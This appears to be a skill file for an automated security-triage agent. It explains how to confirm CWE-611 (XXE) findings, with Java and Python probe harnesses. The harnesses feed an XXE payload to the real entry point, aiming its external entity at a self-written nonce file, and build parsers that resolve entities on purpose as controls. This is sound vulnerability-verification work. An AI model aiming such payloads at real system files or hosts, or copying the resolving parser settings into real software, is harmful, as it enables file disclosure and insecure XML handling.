---
name: cwe-611-xxe
description: Untrusted XML parsed with external entity or DTD resolution. Use this when the finding is CWE-611 or XXE.
metadata:
  owner: appsec
  version: 2.0.1
---

# CWE-611: XML external entity (XXE)

## Use this skill when

- The finding is CWE-611, or names XXE or external entity expansion.
- Untrusted XML reaches a parser whose entity or DTD processing is not disabled.

## Do not use this skill when

- Entity resolution is explicitly disabled and the finding is about something else.
- The document is JSON or YAML — use `cwe-502-deserialization`.
- The XML reaches something that instantiates the types it names: `cwe-502-deserialization`
  wins, because its oracle must observe object construction.

## Procedure

**Sink.** A parser resolving external entities/DTDs: misconfigured `lxml`,
`DocumentBuilderFactory` without secure processing, `XMLReader` with external entities on.
**Source.** Untrusted XML. **Neutralized when** DTDs or external entities are disabled
(secure processing, `resolve_entities=False`, `disallow-doctype-decl`).

## Oracle

Condition: **the parser resolved an external entity to local file content.** Only the
parser calls differ by language.

1. Write a fresh random **nonce** into a marker file under `/tmp` (its content *is* the
   nonce). Point entities only at this file, never at system files or network URLs.
2. Attack document: a DOCTYPE declaring `<!ENTITY xxe SYSTEM "file:///tmp/...">` and a body
   expanding `&xxe;`. Negative document: **no** DOCTYPE, plain text.
3. Pass each to the real entry point, with its own parser configuration, and print one
   `HARNESS_PROBE` line (see `probe`):
   - `target_reached`: the entry point received the document, even if it rejected it.
   - `oracle_valid`: the marker holds the nonce and the attack entity names the marker.
   - `vulnerability_observed`: the returned text **contains the nonce**.
   - `positive_control`: the attack document through a **plain** resolving parser (Java:
     `DocumentBuilderFactory.newInstance()`, no flags) yields the nonce. Do **not**
     hand-toggle `secure-processing` / `external-general-entities` / `ACCESS_EXTERNAL_DTD`:
     they vary by JDK and `--release` and give false negatives.
   - `negative_control`: the no-DOCTYPE document yields text without the nonce.

Commonest bug: a fixed string written to the marker but a *different* random nonce searched
for, so every field reads `false`. A `false` positive control means the oracle is broken,
not the target; fix it first (see `probe`).

### Java (OpenJDK 17 in the workspace)

Compile the target and this runner with the workspace JDK, `--release 17` or no flag,
**never `--release 7`** (no `XMLConstants.ACCESS_EXTERNAL_DTD`). No Maven or JUnit; see
`lang-java`.

```java
// ProbeRunner.java: adjust the import and loader call to the real entry point.
import java.io.ByteArrayInputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Document;
import com.example.XmlLoader; // the target under investigation

public class ProbeRunner {
    public static void main(String[] args) throws Exception {
        String nonce = "xxe_nonce_" + Long.toHexString(System.nanoTime());
        Path marker = Files.createTempFile("xxe_probe_", ".txt");
        Files.writeString(marker, nonce); // file content IS the nonce
        String uri = marker.toUri().toString(); // file:///tmp/...

        String attack = "<?xml version=\"1.0\"?>\n"
            + "<!DOCTYPE r [ <!ENTITY xxe SYSTEM \"" + uri + "\"> ]>\n<r>&xxe;</r>";
        String benign = "<?xml version=\"1.0\"?>\n<r>plain</r>";

        boolean reached = false, vuln = false, pos = false, neg = false;
        try { // real target, its own config
            String out = new XmlLoader().loadTitle(attack); // String entry point
            reached = true; vuln = out != null && out.contains(nonce);
        } catch (Exception e) { reached = true; } // reached it; it rejected
        try { String out = new XmlLoader().loadTitle(benign); neg = out == null || !out.contains(nonce); }
        catch (Exception e) { neg = true; }
        try { pos = plain(attack).contains(nonce); } catch (Exception e) {}
        Files.deleteIfExists(marker);

        System.out.println("HARNESS_PROBE {\"target_reached\": " + reached
            + ", \"oracle_valid\": true, \"positive_control\": " + pos
            + ", \"negative_control\": " + neg
            + ", \"vulnerability_observed\": " + vuln + "}");
    }
    static String plain(String xml) throws Exception {
        DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();
        DocumentBuilder b = f.newDocumentBuilder();
        Document d = b.parse(new ByteArrayInputStream(xml.getBytes("UTF-8")));
        return d.getDocumentElement().getTextContent();
    }
}
```

Match the signature (`String`, `InputStream` or temp `File`). From `/workspace/repo`:

```bash
javac -d /tmp/probe_classes src/main/java/com/example/XmlLoader.java ProbeRunner.java
java -cp /tmp/probe_classes ProbeRunner
```

Verified on the corpus: the plain loader yields the nonce; a `disallow-doctype-decl` loader
rejects the DOCTYPE with both controls `true`.

### Python

Call the target's real sink; the control parser resolves external entities on purpose:

```python
import io, json, os, tempfile, xml.sax
from xml.sax.handler import feature_external_ges

nonce = "xxe_nonce_" + os.urandom(6).hex()
fd, marker = tempfile.mkstemp(prefix="xxe_", suffix=".txt")
os.write(fd, nonce.encode()); os.close(fd)
attack = f'<?xml version="1.0"?>\n<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file://{marker}"> ]>\n<r>&xxe;</r>'
benign = '<?xml version="1.0"?>\n<r>plain</r>'

def pos_control(doc): # resolves entities on purpose
    p = xml.sax.make_parser(); p.setFeature(feature_external_ges, True)
    class H(xml.sax.ContentHandler):
        def __init__(self): self.c = []
        def characters(self, s): self.c.append(s)
    h = H(); p.setContentHandler(h); p.parse(io.StringIO(doc)); return "".join(h.c)

# from target import parse_note # the real entry point
obs = {"oracle_valid": True}
try: obs["target_reached"] = True; obs["vulnerability_observed"] = nonce in (parse_note(attack) or "")
except Exception: obs["target_reached"] = True; obs["vulnerability_observed"] = False
try: obs["negative_control"] = nonce not in (parse_note(benign) or "")
except Exception: obs["negative_control"] = True
try: obs["positive_control"] = nonce in pos_control(attack)
except Exception: obs["positive_control"] = False
os.remove(marker)
print("HARNESS_PROBE " + json.dumps(obs))
```

`lxml` control: `etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=True)`.
`xml.etree.ElementTree` never expands external entities: such a target is structurally
`likely_not_exploitable`; still probe it and report `vulnerability_observed: false`.

### Other languages

Same shape. Resolving controls: Perl `XML::LibXML->new(expand_entities => 1, no_network => 1)`;
JavaScript `libxmljs` with `{ noent: true }` or the parser's entity-resolution flag.
